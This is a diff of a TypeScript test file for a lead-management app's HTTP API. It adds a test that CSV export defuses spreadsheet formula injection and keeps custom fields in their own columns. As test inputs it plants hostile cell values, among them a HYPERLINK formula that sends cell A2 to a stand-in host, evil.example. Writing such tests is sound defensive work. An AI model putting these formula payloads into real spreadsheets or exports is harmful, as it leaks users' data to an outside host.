@@ -1,8 +1,10 @@
+import { parse as parseCsv } from 'csv-parse/sync';
 import { describe, expect, it } from 'vitest';
 import { DAY } from '../src/clock.js';
 import { buildApp } from '../src/app.js';
 import { Engine } from '../src/engine/engine.js';
 import { csvToLeads } from '../src/routes/leads.js';
+import { csvCell } from '../src/http.js';
 import { makeWorld, runFor } from './helpers.js';
 
 async function setup() {
@@ -73,7 +75,7 @@ describe('HTTP API', () => {
     expect(analytics.body.replyRate).toBe(100);
 
     const exported = await call('GET', `/api/leads/export.csv?campaignId=${camp.body.id}`);
-    expect(String(exported.body).split('\n')[0]).toContain('favouriteTool');
+    expect(String(exported.body).split('\n')[0]).toContain('custom_favouriteTool');
     expect(String(exported.body)).toContain('connected');
   });
 
@@ -127,6 +129,42 @@ describe('HTTP API', () => {
     expect(w.ctx.db.get('SELECT failures FROM login_failures')).toEqual({ failures: 1 });
     expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'correct-horse' })).status).toBe(200);
     expect(w.ctx.db.get('SELECT COUNT(*) AS n FROM login_failures')).toEqual({ n: 0 });
+  });
+
+  it('exports CSV that spreadsheets read as text, with custom fields in their own columns', async () => {
+    const { call } = await setup();
+    await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' });
+    const list = await call('POST', '/api/lists', { name: 'L' });
+    const lead = await call('POST', '/api/leads', { listId: list.body.id, profileUrl: 'https://www.linkedin.com/in/evil/', email: 'real@acme.com' });
+    // A scraped headline is whatever the person typed into LinkedIn.
+    const patch = await call('PATCH', `/api/leads/${lead.body.id}`, {
+      firstName: '=HYPERLINK("http://evil.example/?x="&A2,"click")',
+      headline: '@SUM(1+1)',
+      company: '\t-2+3',
+      custom: { 'a,b': 'x', email: 'spoof@evil.example', '=cmd': '+1' },
+    });
+    expect(patch.status).toBe(200);
+    const exported = String((await call('GET', `/api/leads/export.csv?listId=${list.body.id}`)).body);
+    const [header, row] = exported.split('\n');
+    expect(header).toContain('email,');
+    expect(header).toContain('"custom_a,b",custom_email,custom_=cmd');
+    expect(row).toContain('"\'=HYPERLINK(""http://evil.example/?x=""&A2,""click"")"');
+    expect(row).toContain(",'@SUM(1+1),");
+    expect(row).toContain(",'\t-2+3,");
+    expect(row).toContain(',real@acme.com,');
+    expect(row).toContain(",x,spoof@evil.example,'+1");
+    // No cell starts with a formula character, and header and rows have the same number of columns.
+    const [head, cells] = parseCsv(exported) as string[][];
+    expect(cells).toHaveLength(head.length);
+    expect(cells.filter((c) => /^[=+\-@\t\r]/.test(c))).toEqual([]);
+    expect(csvCell('-5')).toBe("'-5");
+    expect(csvCell('\rx')).toBe(`"'\rx"`);
+    expect(csvCell('plain')).toBe('plain');
+
+    // Importing the export gives custom fields their names back.
+    const back = csvToLeads(exported);
+    expect(back[0].custom).toMatchObject({ email: 'spoof@evil.example', aB: 'x' });
+    expect(back[0].email).toBe('real@acme.com');
   });
 
   it('maps common CSV headers', () => {
